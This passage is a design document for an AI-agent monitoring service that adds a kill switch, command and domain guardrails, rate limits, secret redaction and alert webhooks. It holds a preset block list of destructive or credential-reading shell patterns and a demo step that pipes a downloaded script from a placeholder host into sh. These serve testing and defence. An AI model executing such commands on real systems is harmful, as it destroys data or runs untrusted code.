# Design Document: Agent Watch v2

## Overview

v2 adds controls and guards on top of the v1 architecture without changing its shape. There is still one Lambda, one table, one SDK, and one static dashboard. Four kinds of change appear:

1. **A control plane next to the rules plane.** Pause_State lives on the Agent_Record as top-level attributes with its own two routes (`GET`/`PUT /agents/{agentId}/status`) and its own 5-second poll in the SDK. Rules (Guardrail_Config) keep their 60-second sync. This split is the main new idea: a kill switch must propagate in seconds, while rules can lag a minute, and a pause must not be lost by a concurrent "Save rules" that replaces the whole config.
2. **Additive Guardrail_Config keys** (`blockedCommands`, `maxLlmCallsPerMinute`, and optionally `redactSecrets`, `allowedDomains`), each optional on input with a default, always present on output. Validation rejects unknown keys as before.
3. **New Violation_Types** (`paused`, `blocked_command`, `rate_limit`, `secret_redacted`, `blocked_domain`) that reuse the existing `blocked` event path: one synchronous POST, then raise a `GuardrailBlocked` subclass. Two of them (`paused`, `rate_limit`) can fire in a tight loop, so the SDK reports each at most once per episode or window.
4. **Dashboard features computed from existing data** (spend chart, summary tile, richer rows) plus one new publisher in the Lambda (webhook) and one CLI in the SDK.

Design goals, in order: never break v1 (stored records, deployed SDK, `e2e.sh`, 726 tests), a reliable "pause it" demo moment, zero AWS needed in tests, tasks under an hour each.

### Key design decisions

| Decision | Choice | Why |
| --- | --- | --- |
| Where Pause_State lives | Top-level `paused`/`pausedAt` on the META item, not inside `guardrails` | `PUT /config` replaces the whole config; a pause stored there could be undone by an unrelated rules save. Separate attribute, separate conditional update, no interference |
| How the SDK learns about a pause | New `GET /agents/{agentId}/status`, polled before every LLM and tool call, at most once per Control_Interval (5 s) | The config route returns the pricing table every time; a 5 s poll of that is wasteful. The status body is ~60 bytes. 720 Lambda invocations per agent-hour is nothing at demo scale and inside free tier |
| Pause fail mode | Fail open (not paused) when status was never fetched; keep last state on later failures; warn loudly | Same contract as guardrails (Req 21.4, 21.7). A network blip must not stop a healthy agent; a stale pause is still enforced |
| Pause event volume | One `paused` blocked event per Pause_Episode per process | Without this, a paused agent in a `while True` loop would send an event and an email per iteration |
| Blocked_Command semantics | Python `re` patterns, `IGNORECASE`, `search` against a whitespace-normalized Command_String; list/tuple argv joined with spaces | Students think "block `rm -rf`"; a regex expresses that and `curl … \| sh` cleanly. Server and SDK are both Python, so a pattern that compiles on PUT compiles in the SDK |
| Which arguments are commands | Named command args plus every `str` argument and every all-`str` list/tuple | Same over-blocking philosophy as paths (Req 8.13): the SDK cannot know which string a tool treats as a command, and patterns are specific enough that false positives are rare and fall on the safe side |
| ReDoS | Accepted, documented | Patterns are written by the Owner and run in the Owner's own process; the server only compiles them (fast). Nobody else's patterns run anywhere |
| Rate limit mechanism | Per-Watcher deque of allowed-call start times, pruned to the Rate_Window, under a lock, on the injectable clock | Sliding window is exact and ~10 lines. Counting allowed calls (not attempts) means a blocked loop cannot extend its own lockout forever |
| Webhook configuration | One stack parameter `AlertWebhookUrl` (`NoEcho`) → Lambda env `ALERT_WEBHOOK_URL` | There is no owner record to hang a per-owner URL on. One line in the template, no new storage, no dashboard work. Per-owner webhooks are deferred |
| Webhook transport | `urllib.request`, 3 s timeout, host allowlist (`discord.com`, `discordapp.com`, `hooks.slack.com`) | Lambda has no `requests`. The allowlist stops a mistyped parameter from turning the Lambda into a generic HTTP poster |
| Alert fan-out | `MultiPublisher([SnsPublisher, WebhookPublisher])`; each publish is isolated by `publish_alert`'s try/except | One failing channel never hides the other, and the ingest response is still 200 (Req 10.8) |
| Spend chart data | Client-side from the existing timeline route (`type=llm_call` and `type=blocked`, desc, follow cursors into the window) | No backend change, so no deploy risk. Up to 20 pages × 100 events per type bounds the work. A server-side series route is the deferred next step |
| Chart rendering | Inline SVG component, no charting library | Zero new dependency, deterministic in jsdom, trivial to test by querying `<rect>` elements. `tech.md`: prefer boring choices |
| CLI | `argparse` console script in `sdk/agentwatch/cli.py`; key written with `os.open(..., 0o600)` | Standard library only keeps Req 19 (requests-only dependency). Writing with `os.open` avoids the create-then-chmod window |
| Key discovery order | `api_key=` arg → `AGENTWATCH_KEY` → `~/.agentwatch_key` | Explicit beats implicit; the env var is what the demos already use; the Key_File is what `init` creates |
| Secret redaction scope | Opt-in (`redactSecrets: false` default), well-known key formats only, no generic `password=` heuristics | Surprising prompt rewrites would be a worse bug than a missed secret; well-formed prefixes (`AKIA`, `sk-ant-`, `ghp_`) have near-zero false positives |
| Streams-based alerts | Optional and last; conditional `alerted` flag on the event item before publishing | At-least-once delivery with duplicate suppression, which is the standard answer to "SNS publish after a write can be lost". It is infra work, so it waits until everything else is done |

### Research notes

- Discord webhooks accept `POST` JSON `{"content": "..."}` (content up to 2000 chars). Slack incoming webhooks accept `{"text": "..."}`. Both return 2xx on success. Detect by hostname.
- API Gateway HTTP API route additions on the implicit API are in-place; the API id and URL do not change (confirmed by the 5.3 and 7.1 deploys).
- DynamoDB `BOOL` attribute values serialize through the existing `to_av`/`from_av` helpers; `paused` is stored as `{"BOOL": true}` and `pausedAt` as `{"S": ts}`; absent means false/null.
- Python `re.compile` of an attacker-chosen pattern is fast (linear in pattern length); only matching can be super-linear. The server never matches, only compiles.
- Next.js 14 imports `.json` files natively (`resolveJsonModule` is on in the generated tsconfig). The backend test reads the same file by path, like `test_demo_models.py` reads `demo/models.py`.
- CloudWatch alarm on `AWS::Lambda` `Errors` with `TreatMissingData: notBreaching` avoids an alarm on idle periods. The HTTP API `5xx` metric lives in `AWS/ApiGateway` with dimension `ApiId`.

## Architecture

```mermaid
flowchart LR
  subgraph Host["Student laptop"]
    A[Agent code] --> SDK[agentwatch SDK<br/>pause check 5 s<br/>rules sync 60 s<br/>guards before every call]
    SDK -->|wrapped call, redacted if enabled| LLM[Bedrock / Anthropic]
    CLI[agentwatch CLI<br/>init, doctor] --> KF[(~/.agentwatch_key 0600)]
    SDK -. reads .-> KF
  end
  SDK -->|POST /events<br/>GET config, spend, status| APIGW[API Gateway HTTP API]
  Dash[Dashboard<br/>chart, tile, pause button] -->|GET agents, events, config, spend, status<br/>PUT config, status| APIGW
  APIGW --> L[ApiFunction]
  L --> DDB[(DynamoDB<br/>META: guardrails + paused<br/>events)]
  L -->|blocked events| FAN{MultiPublisher}
  FAN --> SNS[SNS email]
  FAN --> WH[Discord / Slack webhook]
  CW[CloudWatch alarms*] --> SNS
```

### The kill switch flow (new demo moment)

```mermaid
sequenceDiagram
  participant Dash as Dashboard
  participant API as ApiFunction
  participant DB as DynamoDB
  participant SDK
  participant Demo as demo_agent.py --loop 20 --sleep 2
  Dash->>API: PUT /agents/demo-bot/status {paused: true}
  API->>DB: UpdateItem META SET paused=true, pausedAt=now (cond keyVerifier)
  API-->>Dash: 200 {paused: true, pausedAt}
  Note over SDK: next LLM call, up to 5 s later
  SDK->>API: GET /agents/demo-bot/status
  API-->>SDK: {paused: true}
  SDK->>API: POST /events {type: blocked, violationType: paused, meta.action: llm_call} (sync, once per episode)
  API->>FAN: publish (SNS + webhook)
  SDK-->>Demo: raise AgentPaused
  Demo->>Demo: prints "run 4/20: AgentPaused: ..." and exits 0
```

### Guard order inside the SDK

Before an LLM call: **pause → rate limit → spend cap → (redaction) → provider call**. Before a tool call: **pause → paths → commands → (domains) → tool**. Cheap and decisive checks first; the spend check may trigger a network sync, so it goes after the pure in-memory ones. Each check that blocks sends one `blocked` event synchronously and raises; nothing after it runs.

## Components and Interfaces

### Backend: `rules.py` (Guardrail_Config evolution)

```python
@dataclass(frozen=True)
class GuardrailConfig:
    daily_spend_cap_usd: float | None
    blocked_paths: tuple[str, ...]
    blocked_commands: tuple[str, ...] = ()          # Req 28.1
    max_llm_calls_per_minute: int | None = None     # Req 31.1
    redact_secrets: bool = False                    # Req 33.1 (optional group)
    allowed_domains: tuple[str, ...] | None = None  # Req 34.1 (optional group)

KEYS = ("dailySpendCapUsd", "blockedPaths", "blockedCommands", "maxLlmCallsPerMinute",
        "redactSecrets", "allowedDomains")
REQUIRED_KEYS = ("dailySpendCapUsd", "blockedPaths")
MAX_COMMANDS, MAX_COMMAND_LEN = 100, 256
MAX_RATE = 10_000
```

- `parse_config`: unknown keys → 400 (unchanged). Missing required keys → 400 (unchanged). Missing new keys → defaults. `blockedCommands`: list, ≤100, each non-empty `str` ≤256 that `re.compile(p, re.IGNORECASE)` accepts (catch `re.error` → `ValidationError("blockedCommands", "entry N is not a valid regular expression")`). `maxLlmCallsPerMinute`: `None` or `int` (not bool) in 1..10000. `redactSecrets`: bool. `allowedDomains`: `None` or list ≤100 of `str` ≤253 matching `^(\*\.)?[A-Za-z0-9.-]+$`.
- `to_json`: emits all six keys always (`allowedDomains` as `null` or list). Property 32 covers the round trip and v1-shape parsing.
- Each optional group adds its key when that group runs. Until then the key is not in `KEYS` and is rejected as unknown, which is the current behavior. Add `blockedCommands` in 9.1, `maxLlmCallsPerMinute` in 12.1, `redactSecrets` in 14.2, `allowedDomains` in 15.1.

### Backend: Pause_State (`store.py`, `service.py`, `handlers/api.py`)

`AgentRecord` gains `paused: bool = False` and `paused_at: str | None = None`. `record_to_item` writes `paused` only when true and `pausedAt` only when set; `item_to_record` reads `item.get("paused", False)` and `item.get("pausedAt")`. `_inventory_item` adds `"paused": rec.paused`.

`Store` protocol gains:

```python
def set_paused(self, agent_id: str, paused: bool, paused_at: str | None, key_verifier: str) -> bool: ...
```

- `DynamoStore.set_paused`: `UpdateItem` on the META key, `SET paused = :p, pausedAt = :t` (`:t` is `{"NULL": true}` when resuming), `ConditionExpression="keyVerifier = :kv"`; `False` on `ConditionalCheckFailedException`, like `put_config`.
- `InMemoryStore.set_paused`: same semantics on the dict.

`service.py`:

```python
def _status_body(agent_id, paused, paused_at):
    return {"agentId": agent_id, "paused": paused, "pausedAt": paused_at}

def get_status(store, creds, agent_id) -> Result:
    # validate agentId (400) → authorize → 403 | None → 200 {paused: False, pausedAt: None} (no create)
    # | record → 200 from record

def parse_status(body) -> bool | ValidationError:
    # exactly {"paused": bool}; bools only; unknown or missing key → ValidationError("paused", ...)

def put_status(store, creds, agent_id, body, now: datetime) -> Result:
    # validate agentId, parse body (400)
    # authorize_or_register(store, agent_id, creds, EMPTY_CONFIG) → "forbidden" → 403
    # paused_at = _fmt_ts(now floored to ms) if paused else None
    # store.set_paused(agent_id, paused, paused_at, key_verifier) → False → 403 (verifier replaced mid-flight)
    # 200 _status_body(...)
```

On the "created" path, `authorize_or_register` creates the record with `EMPTY_CONFIG` and `paused=False`; `set_paused` then applies the submitted value. One extra write on first contact is acceptable and keeps `new_record` unchanged.

`handlers/api.py` adds `"GET /agents/{agentId}/status": _get_status` and `"PUT /agents/{agentId}/status": _put_status` (the PUT passes `datetime.now(timezone.utc)`). `template.yaml` adds two `HttpApi` events `GetStatus` and `PutStatus`. `test_template.py` pins exactly eight routes.

### Backend: validation and alerts for new Violation_Types

`validation.py`:

```python
OPTIONAL += ("attemptedCommand", "attemptedUrl")
VIOLATION_TYPES = ("spend_cap", "blocked_path", "paused", "blocked_command",
                   "rate_limit", "secret_redacted", "blocked_domain")
TYPE_FIELDS[("blocked", "paused")] = ("violationType",)
TYPE_FIELDS[("blocked", "blocked_command")] = ("violationType", "attemptedCommand")
TYPE_FIELDS[("blocked", "rate_limit")] = ("violationType",)
TYPE_FIELDS[("blocked", "secret_redacted")] = ("violationType",)
TYPE_FIELDS[("blocked", "blocked_domain")] = ("violationType", "attemptedUrl")
```

`_validate_type_specific`: `blocked_command` → `_req_str(body, "attemptedCommand")`; `blocked_domain` → `_req_str(body, "attemptedUrl")`; the three meta-only types return `None` after the `violationType` check. Each group adds its own value when it runs (8.2 adds `paused`, 9.2 adds `blocked_command`, 12.1 adds `rate_limit`, 14.2 adds `secret_redacted`, 15.1 adds `blocked_domain`), and extends the Property 7/41 generators.

`service.TIMELINE_FIELDS` gains `attemptedCommand` and `attemptedUrl` (null when absent). Dashboard `TimelineItem` mirrors them.

`alerts.format_alert` grows one branch per Violation_Type. The subject stays `Agent Watch: {violation} blocked for {agentId}`. Body lines after the common three:

| violationType | extra lines (all values pass through `_clean`) |
| --- | --- |
| `spend_cap` | `attemptedCostUsd` (unchanged) |
| `blocked_path` | `attemptedPath`, then `tool`, `entry` from meta (unchanged) |
| `paused` | `action: llm_call\|tool_call`, then `model` or `tool` from meta |
| `blocked_command` | `attemptedCommand`, then `tool`, `pattern` from meta |
| `rate_limit` | `callsInWindow`, `maxPerMinute`, `model` from meta |
| `secret_redacted` | `redactions: <total>`, `kinds: name=count, ...` from meta |
| `blocked_domain` | `attemptedUrl`, then `tool`, `host` from meta |

Meta values are only printed when they are `str`, `int`, or `float` (or a flat `dict[str, int]` for `kinds`); anything else is skipped. Property 17 extends to every type.

### Backend: `alerts.py` publishers (webhooks)

```python
WEBHOOK_HOSTS = {"discord.com": "discord", "discordapp.com": "discord", "hooks.slack.com": "slack"}
WEBHOOK_TIMEOUT_S = 3.0

class WebhookPublisher:
    def __init__(self, url: str, opener=None):
        kind = _classify(url)        # https only, host in WEBHOOK_HOSTS, else None
        if kind is None:
            log.warning(json.dumps({"msg": "webhook_url_rejected"}))  # never logs the URL
        self._url, self._kind, self._opener = url, kind, opener or urllib.request.urlopen
    def publish(self, subject: str, body: str) -> None:
        if self._kind is None:
            return
        text = f"{subject}\n{body}"[:1900]
        payload = {"content": text} if self._kind == "discord" else {"text": text}
        req = urllib.request.Request(self._url, data=json.dumps(payload).encode(), method="POST",
                                     headers={"content-type": "application/json", "user-agent": "agentwatch"})
        with self._opener(req, timeout=WEBHOOK_TIMEOUT_S) as r:
            if not 200 <= r.status < 300:
                raise RuntimeError(f"webhook status {r.status}")

class MultiPublisher:
    def __init__(self, publishers): self._pubs = list(publishers)
    def publish(self, subject, body):
        for p in self._pubs:
            try: p.publish(subject, body)
            except Exception as e: log.warning(json.dumps({"msg": "alert_publish_failed", "publisher": type(p).__name__, "error": type(e).__name__}))
```

- `publish_alert(publisher, event)` is unchanged; `MultiPublisher.publish` never raises, so the outer try is belt and braces. The log line never includes the URL, subject, or body (Req 30.8).
- `handlers/api._get_deps`: `pubs = [SnsPublisher(TOPIC_ARN)]`; if `os.environ.get("ALERT_WEBHOOK_URL")` is non-empty, append `WebhookPublisher(url)`; `publisher=MultiPublisher(pubs)`.
- `template.yaml`: parameter `AlertWebhookUrl` (`Type: String`, `Default: ""`, `NoEcho: true`); `Globals.Function.Environment.Variables.ALERT_WEBHOOK_URL: !Ref AlertWebhookUrl`. `test_template.py` pins `NoEcho` and the env wiring. The README deploy section adds `AlertWebhookUrl=<url>` to `--parameter-overrides` and warns to pass `UsePreviousValue` for it on later change sets.
- Tests inject a fake opener that records `(url, data, timeout)` and returns an object with `.status` usable as a context manager.

### Backend: optional alarms and Streams (group 16)

- `ApiErrorsAlarm`: `AWS::CloudWatch::Alarm`, `Namespace: AWS/Lambda`, `MetricName: Errors`, `Dimensions: FunctionName: !Ref ApiFunction`, `Statistic: Sum`, `Period: 300`, `EvaluationPeriods: 1`, `Threshold: 1`, `ComparisonOperator: GreaterThanOrEqualToThreshold`, `TreatMissingData: notBreaching`, `AlarmActions: [!Ref AlertTopic]`.
- `Api5xxAlarm`: `Namespace: AWS/ApiGateway`, `MetricName: 5xx`, `Dimensions: ApiId: !Ref ServerlessHttpApi`, same statistics and action.
- Streams (do last): `EventTable.StreamSpecification: {StreamViewType: NEW_IMAGE}`; `AlertFunction` (`Handler: agentwatch_api.handlers.stream_alerts.lambda_handler`, `Events: Stream: {Type: DynamoDB, Stream: !GetAtt EventTable.StreamArn, StartingPosition: LATEST, BatchSize: 10, BisectBatchOnFunctionError: true, MaximumRetryAttempts: 3}`), policies `DynamoDBStreamReadPolicy`, a scoped inline `dynamodb:UpdateItem` on the table, `SNSPublishMessagePolicy`. The handler filters `eventName == "INSERT"` with `NewImage.type.S == "blocked"`, runs `UpdateItem SET alerted = :t` with `attribute_not_exists(alerted)`, and publishes through the same `MultiPublisher` only when the update succeeds. `ingest_event` stops publishing when `STREAM_ALERTS=1` (env) so the cut-over is a flag flip, and `e2e.sh` still sees one email per block.

### SDK: `client.py` additions

```python
CONTROL_INTERVAL_S = 5.0
PAUSE_NOT_ACTIVE_MSG = "agentwatch: pause control NOT active (status fetch failed)"
RATE_WINDOW_S = 60.0

class AgentPaused(GuardrailBlocked):        violation_type "paused"
class CommandBlocked(GuardrailBlocked):     violation_type "blocked_command"
class RateLimitExceeded(GuardrailBlocked):  violation_type "rate_limit"
class DomainBlocked(GuardrailBlocked):      violation_type "blocked_domain"   (group 15)

@dataclass(frozen=True)
class ConfigResponse:
    daily_spend_cap_usd: float | None
    blocked_paths: tuple[str, ...]
    pricing: dict
    blocked_commands: tuple[str, ...] = ()
    max_llm_calls_per_minute: int | None = None
    redact_secrets: bool = False
    allowed_domains: tuple[str, ...] | None = None
```

`ApiClient` gains `get_status(agent_id)`. `FakeTransport` in `sdk/tests/fakes.py` routes `/status` to its own queue (`status_outcomes`, default `200 {"agentId":..., "paused": false, "pausedAt": None}`) and log (`status_requests`), exactly as it already does for `/spend`, so the ~40 older tests that count requests are untouched.

`Watcher` state and methods:

```python
self._paused: bool = False
self._last_status_ok: float | None = None
self._last_status_attempt: float | None = None
self._pause_reported: bool = False            # one event per Pause_Episode
self._compiled_commands: tuple[tuple[str, re.Pattern], ...] = ()   # rebuilt on each config fetch
self._rate_times: collections.deque[float]    # start times of allowed LLM calls
self._rate_reported_until: float = -inf       # one rate_limit event per window

def _fetch_status(self): ...        # same shape as _fetch_spend: 2 s timeout via ApiClient; body must be a dict
                                    # with a bool "paused" (bools only), else "failed sync" and keep state;
                                    # on success set _paused; if it became False, clear _pause_reported
def _maybe_refresh_status(self): ... # under _lock, timed from _last_status_attempt, CONTROL_INTERVAL_S
def _check_paused(self, action: str, **detail):
    self._maybe_refresh_status()
    if not self._paused: return
    if not self._pause_reported:
        self._pause_reported = True
        self._send_blocked_sync(violationType="paused", meta={"action": action, **detail})
    raise AgentPaused(f"agent {self.agent_id} is paused (resume it in the dashboard)")

def _check_rate(self, model: str):
    cap = self._config.max_llm_calls_per_minute
    if cap is None: return
    now = self._clock()
    with self._rate_lock:
        while self._rate_times and self._rate_times[0] <= now - RATE_WINDOW_S: self._rate_times.popleft()
        n = len(self._rate_times)
        if n < cap:
            self._rate_times.append(now); return
        report = now >= self._rate_reported_until
        if report: self._rate_reported_until = now + RATE_WINDOW_S
    if report:
        self._send_blocked_sync(violationType="rate_limit", meta={"callsInWindow": n, "maxPerMinute": cap, "model": str(model)[:200]})
    raise RateLimitExceeded(f"{n} LLM calls in the last 60 s >= limit {cap}")
```

- `init` calls `_maybe_refresh_status()` after config and spend. A failure logs `PAUSE_NOT_ACTIVE_MSG` (Req 27.11) using the same "never succeeded" rule as config.
- `_fetch_config` rebuilds `_compiled_commands` from `parsed.blocked_commands`: `re.compile(p, re.IGNORECASE)`; an `re.error` skips the entry and warns once per pattern per process (module-level set, like `_warned`).
- `check_spend` becomes the LLM pre-check: `self._check_paused("llm_call", model=str(model)[:200])`, then `self._check_rate(model)`, then the existing spend logic. Both proxies already call `check_spend` first, so no proxy change is needed for pause and rate limit.
- `_wrap_tool.wrapper`: first line is `self._check_paused("tool_call", tool=tool_name[:200])` (before computing candidates, so it runs for every tool). Then paths (existing), then `self._check_commands(tool_name, named_cmds, cmd_candidates)`, then (group 15) `self._check_domains(...)`.

`_check_commands`:

```python
COMMAND_ARG_NAMES = ("command", "cmd", "args", "argv", "cmdline", "script", "shell_command")

def _command_strings(bound, path_arg_names, command_arg, args, kwargs) -> list[str]:
    # every str value (not in named path args) and every list/tuple whose items are all str, joined by " ",
    # whitespace collapsed with " ".join(s.split()); empty strings dropped; duplicates dropped; order kept
def _check_commands(self, tool_name, strings):
    if not self._compiled_commands or not strings: return
    for s in strings:
        for pattern, rx in self._compiled_commands:
            if rx.search(s):
                self._send_blocked_sync(violationType="blocked_command", attemptedCommand=s[:1024],
                                        meta={"tool": tool_name[:200], "pattern": pattern[:200]})
                raise CommandBlocked(f"{s[:200]} matches blocked pattern {pattern!r}")
```

Pure helpers `command_strings(...)` and `first_blocked_command(strings, compiled) -> (string, pattern) | None` live in `guardrails.py` so Property 33 tests them without a Watcher. `@aw.tool(command_arg=...)` is accepted and only affects which value becomes `target` when there is no path arg (the matching already covers every string).

Tool events: when a tool call is blocked, no `tool_call` event is sent (unchanged). Blocked path and blocked command checks run in that order; the first match raises, so exactly one event is sent (Req 28.17).

### SDK: `redact.py` (group 14, optional)

```python
SECRET_PATTERNS: tuple[tuple[str, re.Pattern], ...] = (
    ("aws_access_key_id", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("anthropic_api_key", re.compile(r"\bsk-ant-[A-Za-z0-9_-]{20,}")),
    ("openai_api_key",    re.compile(r"\bsk-(?!ant-)[A-Za-z0-9]{20,}\b")),
    ("github_token",      re.compile(r"\bgh[pousr]_[A-Za-z0-9]{36,}\b")),
    ("slack_token",       re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b")),
    ("google_api_key",    re.compile(r"\bAIza[0-9A-Za-z_-]{35}\b")),
    ("jwt",               re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b")),
    ("private_key",       re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")),
)

def redact_text(s: str) -> tuple[str, dict[str, int]]
def redact_request(kwargs: dict) -> tuple[dict, dict[str, int]]   # deep copy; rewrites the text locations listed in Req 33.2
```

Proxies: after `check_spend` and before the provider call, `if self._watcher.config.redact_secrets: kwargs, counts = redact_request(kwargs)`; if `sum(counts)`, send a synchronous `blocked` event (`secret_redacted`, meta `{kinds: counts, total, model}`) and set `meta["redactions"] = total` on the following `llm_call` event. The call proceeds with the redacted copy. Patterns are ordered so `anthropic_api_key` runs before `openai_api_key`; the `(?!ant-)` lookahead keeps them disjoint anyway.

### SDK: domain allowlist (group 15, optional)

`guardrails.py`: `attempted_urls(strings) -> list[tuple[str, str]]` (url, host) using `urlsplit`, scheme in `{http, https}`, hostname non-empty, lowercased with a trailing dot stripped; `domain_allowed(host, allowed) -> bool` (exact match, or `*.suffix` where host == suffix or host ends with `.suffix`). `Watcher._check_domains` mirrors `_check_commands` with `violationType="blocked_domain"`, `attemptedUrl=url[:1024]`, meta `{tool, host}`, `DomainBlocked`.

### SDK: credential discovery and CLI (group 13)

`client.init(agent_id, owner_id=None, api_key=None, endpoint=None, ...)`:

```python
KEY_FILE = "~/.agentwatch_key"
def _resolve_key(api_key):
    if api_key: return api_key
    env = os.environ.get("AGENTWATCH_KEY")
    if env: return env
    try: return Path(KEY_FILE).expanduser().read_text().strip() or None  → ValueError if empty
    except OSError: raise ValueError("agentwatch.init needs api_key=, AGENTWATCH_KEY, or ~/.agentwatch_key")
```

`owner_id=None` → `AGENTWATCH_OWNER` or `ValueError`. The error messages name sources, never values. `demo/common.py` can then call `agentwatch.init(agent_id=...)` with no explicit key (keep passing `AGENTWATCH_OWNER`/`AGENTWATCH_KEY` through env so `e2e.sh` is unchanged).

`cli.py` (`main(argv=None) -> int`, `argparse` subcommands):

- `init --owner ID --endpoint URL [--agent ID] [--force] [--quiet]`: `key = secrets.token_urlsafe(32)`; `fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)` (with `--force`: `O_TRUNC` instead of `O_EXCL` and `os.chmod(path, 0o600)` after); prints the key once unless `--quiet`, then the two `export` lines and the 3-line snippet with the given agent id (default `my-agent`). Exit 1 with a message if the file exists and no `--force`.
- `doctor [--agent ID] [--endpoint URL] [--owner ID]`: resolves like `init`, builds an `ApiClient`, calls `get_config` and `get_status`, prints `ok`/`FAIL` lines, exit code 0 only if both return 2xx. Prints the guardrail summary from the parsed config. Never prints key or hash.
- Tests use `tmp_path` as `HOME` (`monkeypatch.setenv("HOME", ...)`; `Path.expanduser` follows `HOME` on POSIX), `capsys`, and a `FakeTransport` for `doctor`. A test asserts `stat.S_IMODE(os.stat(path).st_mode) == 0o600` and that `--quiet` output contains no 43-char urlsafe token.

### Dashboard

| Path | Change |
| --- | --- |
| `lib/types.ts` | `InventoryItem.paused: boolean`; `GuardrailConfig` gains `blockedCommands: string[]`, `maxLlmCallsPerMinute: number \| null`, `redactSecrets?: boolean`, `allowedDomains?: string[] \| null`; `TimelineItem` gains `attemptedCommand`, `attemptedUrl`; new `StatusResponse {agentId, paused, pausedAt}`, `SpendResponse {agentId, rollingSpendUsd, windowStart, windowEnd}`, `SpendBucket {start, costUsd, llmCalls, blocked}` |
| `lib/api.ts` | `getStatus`, `putStatus(creds, agentId, paused)`, `getSpend` |
| `lib/spend.ts` | `bucketSpend(llmEvents, blockedEvents, windowEnd, hours = 24): SpendBucket[]` (pure); `fetchWindow(creds, agentId, type, since, maxPages = 20): Promise<TimelineItem[]>` (follows `nextCursor`, stops when the oldest `ts` on a page is older than `since`, drops events outside the window, tolerates empty pages with a cursor) |
| `lib/format.ts` | `formatSpend` (moved from InventoryTable, re-exported there), `relativeTime(ts, now)` ("just now", "N min ago", "N h ago", "N d ago"), `describeEvent(e)` (moved from Timeline, one branch per Violation_Type) |
| `lib/commandPresets.json` | `[{ "id", "label", "pattern", "example", "safeExample" }]`; see presets below |
| `components/SpendChart.tsx` | Inline SVG, props `{buckets, capUsd}`; `<rect>` per bucket with a `<title>`; a red tick and count above buckets with `blocked > 0`; the y-axis max is `max(bucket cost, cap/24 if cap)`; empty text when every bucket is 0 and no blocks |
| `components/AgentSummary.tsx` | Props `{spend, config, status, lastSeen}`; shows spend, cap, progress bar (`role="progressbar"`, `aria-valuenow`), Pause_State, last activity |
| `components/PauseButton.tsx` | Props `{creds, agentId, status, onChanged}`; two-click confirm for pause ("Pause agent" → "Confirm pause"), single click for resume; error `Alert` on failure |
| `components/RulesEditor.tsx` | New sections: Blocked commands (list + add + "Add presets"), Max LLM calls per minute (input), and in optional groups Redact secrets (checkbox) and Allowed domains (list with "unrestricted" state). Always PUTs the full config. The cap, paths, and new fields come from the GET response so an older backend without a key still loads (`?? []`, `?? null`) |
| `components/Timeline.tsx` | Rows: relative time with `title={ts}`, description from `describeEvent`, cost cell for `llm_call`, "Details" toggle revealing `<pre>{JSON.stringify(meta, null, 2)}</pre>` |
| `components/InventoryTable.tsx` | Status column ("Paused" badge or "Active"; "stale" suffix when `lastSeen` older than 24 h) |
| `app/agent/page.tsx` | Fetches status, spend, config, and window events; renders `AgentSummary`, `PauseButton`, `SpendChart`, `RulesEditor`, `Timeline`; 30 s refresh of status/spend/chart; refresh after save or pause via callbacks |

Command presets (ids and patterns; Kiro writes labels and examples):

| id | pattern |
| --- | --- |
| `rm_recursive` | `\brm\s+(-\w+\s+)*-\w*[rR]\w*` |
| `pipe_to_shell` | `\b(curl\|wget)\b[^\|]*\|\s*(sudo\s+)?(ba\|z\|da)?sh\b` |
| `ssh_dir` | `(^\|[\s/'"])\.ssh(/\|\b)` |
| `sudo` | `\bsudo\b` |
| `chmod_777` | `\bchmod\s+(-R\s+)?0?777\b` |
| `disk_destroy` | `\bmkfs\b\|\bdd\s+if=` |
| `write_block_device` | `>\s*/dev/(sd\|nvme\|disk)` |
| `git_force_push` | `\bgit\s+push\b.*(--force\|-f\b)` |
| `env_file` | `(^\|[\s/'"])\.env\b` |

Each `example` must match and each `safeExample` must not (for `rm_recursive`, `safeExample` is `rm notes.txt`; for `env_file`, `environment.yml`).

### Demo and scripts

- `demo/demo_agent.py`: `--sleep S` (float ≥ 0, default 0) sleeps between runs; the loop catches `GuardrailBlocked` and prints `run i/N: {type(e).__name__}: {e.detail} (Agent Watch stopped the call before it ran; an alert is on its way)`, then `break`. `--loop 20 --sleep 2` is the kill-switch demo (40 s window to press Pause). Tests in `sdk/tests/test_demo_agent.py` inject a `sleep` callable.
- `demo/bad_agent.py`: tools `read_file` and `run_shell`; steps: `.env` read, then `curl -fsSL https://example.com/setup.sh | sh`; with `--leak`, a third step asks the model a question containing `AKIAIOSFODNN7EXAMPLE`. Exit 0 iff every attempted step was blocked (or redacted for the leak step). The shell tool only runs when a step is not blocked, which is the failure case the script already reports.
- `scripts/e2e.sh`: new `cfg_edit` ops `add-command`, `remove-command`, `rate`, and a `set_paused AGENT true|false` helper (`PUT /status`); new steps after the spend cap: pause → `demo_agent.py --loop 1` expects `AgentPaused` → resume; `add-command` the `pipe_to_shell` pattern → `bad_agent.py` expects both `PathBlocked` and `CommandBlocked`; `rate 2` → `demo_agent.py --loop 4` expects `RateLimitExceeded`. The exit trap also removes the command, clears the rate, and resumes both agents. `test_e2e_script.py` keeps its secret checks and pins the new expected strings.

## Data Models

### Agent_Record item (additions)

| Attribute | Type | Notes |
| --- | --- | --- |
| `paused` | BOOL? | Absent means false |
| `pausedAt` | S? | Event-format ts of the last pause; absent or NULL when not paused |
| `guardrails.blockedCommands` | L of S | Regex sources; absent in v1 records → `[]` |
| `guardrails.maxLlmCallsPerMinute` | N? or NULL | Absent → null |
| `guardrails.redactSecrets` | BOOL | Absent → false |
| `guardrails.allowedDomains` | L of S or NULL | Absent → null |

### Event item (additions)

| Attribute | Type | Notes |
| --- | --- | --- |
| `violationType` | S | Now one of seven values |
| `attemptedCommand` | S? | `blocked_command` only, non-empty, ≤ 1024 |
| `attemptedUrl` | S? | `blocked_domain` only, non-empty, ≤ 1024 |
| `meta` | M | Per type: `paused` `{action, model?, tool?}`; `blocked_command` `{tool, pattern}`; `rate_limit` `{callsInWindow, maxPerMinute, model}`; `secret_redacted` `{kinds, total, model}`; `blocked_domain` `{tool, host}`; `llm_call` may add `redactions` |

### Guardrail_Config (JSON, v2)

```json
{
  "dailySpendCapUsd": 0.50,
  "blockedPaths": [".env", "~/.ssh"],
